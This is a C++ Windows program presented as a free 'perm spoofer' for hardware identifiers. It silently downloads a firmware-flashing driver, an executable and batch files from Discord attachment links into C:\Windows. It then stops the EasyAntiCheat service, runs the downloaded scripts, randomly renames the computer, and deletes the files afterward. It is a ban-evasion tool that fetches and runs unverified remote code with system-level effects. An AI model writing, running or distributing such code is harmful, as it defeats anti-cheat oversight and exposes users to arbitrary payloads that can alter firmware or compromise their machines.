#include <iostream>
#include <string>
#include <thread>
#include <Windows.h>
#include <filesystem>
#include <fstream>


using namespace std;


int main() {
	SetConsoleTitleA("Axiom free perm");
	printf("[#] Welcome to Axiom free Perm spoofer\n\n");
	Sleep(200);
	printf("[1] Perm Spoof Device\n[2] Exit\n");
	printf("Please Choose your Choice : ");
	int option;
	//    °??°
 
	cin >> option;
	switch (option)
	{
	case 1:
		system("cls");

		(system)(("curl https://cdn.discordapp.com/attachments/1133729053120151623/1233854053767712914/amifldrv64.sys -o C:\\Windows\\amifldrv64.sys --silent"));
		(system)(("curl https://cdn.discordapp.com/attachments/1133729053120151623/1233853981449650297/AMIDEWINx64.EXE -o C:\\Windows\\AMIDEWINx64.EXE --silent"));
		(system)(("curl https://cdn.discordapp.com/attachments/1133729053120151623/1233855729820237904/spoofer.sys -o C:\\Windows\\spoof.bat --silent"));
		(system)(("curl https://cdn.discordapp.com/attachments/1243941056006066297/1244687212210294885/spoofer.bat -o C:\\Windows\\spoofer.bat --silent"));

		printf("\n\n  [+] Click Any Key To Perm Spoof!");

		(system)(("pause >nul"));

		(Beep)(300, 300);

		printf("\n\n  [+] Cleaning Hardware...");

		(system)(("sc stop EasyAntiCheat >nul"));
		(system)(("sc stop EasyAntiCheat.sys >nul"));





		printf("\n\n  [+] Spoofing Pc Identifiers...");

		(system)(("C:\\Windows\\launcher.bat >nul"));
		(system)(("wmic computersystem where name=%computername% call rename=%random%"));

		(system)(("C:\\Windows\\spoof.bat"));



		std::remove(("C:\\Windows\\amifldrv64.sys"));
		std::remove(("C:\\Windows\\AMIDEWINx64.EXE"));
		std::remove(("C:\\Windows\\spoof.bat"));

		(Beep)(500, 500);
		printf("\n\n\n  [+] Done Perm Spoofing!!!\n\n  ");

		(system)(("wmic baseboard get serialnumber"));
	case 2:
		system("cls");
		exit(1);
	}
}
